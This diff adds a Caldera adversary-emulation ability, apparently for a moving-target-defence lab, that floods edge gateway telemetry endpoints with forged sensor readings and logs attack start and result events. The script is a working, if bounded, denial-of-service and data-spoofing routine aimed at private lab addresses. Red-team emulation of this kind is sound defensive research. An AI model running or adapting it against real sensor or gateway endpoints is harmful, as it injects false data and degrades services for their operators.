@@ -1,0 +1,73 @@
+- id: 62e7655e-dc3e-49e2-9564-220d7c15582e
+  name: LLM MTD controlled edge HTTP telemetry load
+  description: Sends bounded telemetry traffic to edge gateway endpoints to create measurable lab effects.
+  tactic: impact
+  technique:
+    attack_id: T1499
+    name: Endpoint Denial of Service
+  platforms:
+    linux:
+      sh:
+        command: |
+          SCENARIO_ID="${SCENARIO_ID:-sen4_edge2_clouddb}"
+          ATTACK_SENSOR_ID="${ATTACK_SENSOR_ID:-${SENSOR_ID:-sen4}}"
+          ENTRY_NODE="${ENTRY_NODE:-${ATTACK_SENSOR_ID}}"
+          LOGGER_URL="${LOGGER_URL:-http://10.0.10.14:8000/attack/event}"
+          REQUESTS="${ATTACK_REQUESTS:-25}"
+          SLEEP_SECONDS="${ATTACK_SLEEP_SECONDS:-0.2}"
+
+          if [ -n "${TARGET_GATEWAYS:-}" ]; then
+            GATEWAYS="${TARGET_GATEWAYS}"
+          elif [ "${ATTACK_SENSOR_ID}" = "sen6" ]; then
+            GATEWAYS="http://10.0.2.1:8000/telemetry http://10.0.3.1:8000/telemetry"
+          else
+            GATEWAYS="http://10.0.2.1:8000/telemetry"
+          fi
+
+          echo "[edge_http_abuse] scenario=${SCENARIO_ID} sensor=${ATTACK_SENSOR_ID} gateways=${GATEWAYS} requests=${REQUESTS}"
+          curl -sS -m 2 -X POST "${LOGGER_URL}" \
+            -H 'Content-Type: application/json' \
+            -d "{\"event_type\":\"attack_start\",\"scenario_id\":\"${SCENARIO_ID}\",\"entry_node\":\"${ENTRY_NODE}\",\"tool\":\"caldera\",\"adversary_id\":\"edge_http_abuse\"}" \
+            >/dev/null || true
+
+          accepted=0
+          failed=0
+          gateway_seen=false
+          sequence=900000
+
+          for gateway_url in ${GATEWAYS}; do
+            i=1
+            while [ "${i}" -le "${REQUESTS}" ]; do
+              sequence=$((sequence + 1))
+              timestamp="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
+              payload="{\"sensor_id\":\"${ATTACK_SENSOR_ID}\",\"sequence\":${sequence},\"timestamp\":\"${timestamp}\",\"sensor_sent_at\":\"${timestamp}\",\"payload_type\":\"caldera_lab_telemetry\",\"value\":99.9,\"quality\":\"caldera_lab\",\"caldera_scenario_id\":\"${SCENARIO_ID}\"}"
+              status="$(curl -sS -m 3 -o "/tmp/caldera_edge_http_abuse_${i}.out" -w "%{http_code}" -X POST "${gateway_url}" -H 'Content-Type: application/json' -d "${payload}")"
+              if [ "$?" -ne 0 ]; then
+                status="000"
+              fi
+              case "${status}" in
+                2*)
+                  accepted=$((accepted + 1))
+                  gateway_seen=true
+                  ;;
+                *)
+                  failed=$((failed + 1))
+                  ;;
+              esac
+              i=$((i + 1))
+              sleep "${SLEEP_SECONDS}"
+            done
+          done
+
+          success=false
+          if [ "${accepted}" -gt 0 ]; then
+            success=true
+          fi
+
+          echo "[edge_http_abuse] accepted=${accepted} failed=${failed}"
+          curl -sS -m 2 -X POST "${LOGGER_URL}" \
+            -H 'Content-Type: application/json' \
+            -d "{\"event_type\":\"attack_result\",\"scenario_id\":\"${SCENARIO_ID}\",\"entry_node\":\"${ENTRY_NODE}\",\"tool\":\"caldera\",\"adversary_id\":\"edge_http_abuse\",\"success\":${success},\"gateway_seen\":${gateway_seen},\"worker_seen\":false,\"cloud_seen\":false,\"accepted_requests\":${accepted},\"failed_requests\":${failed}}" \
+            >/dev/null || true
+        cleanup: |
+          rm -f /tmp/caldera_edge_http_abuse_*.out
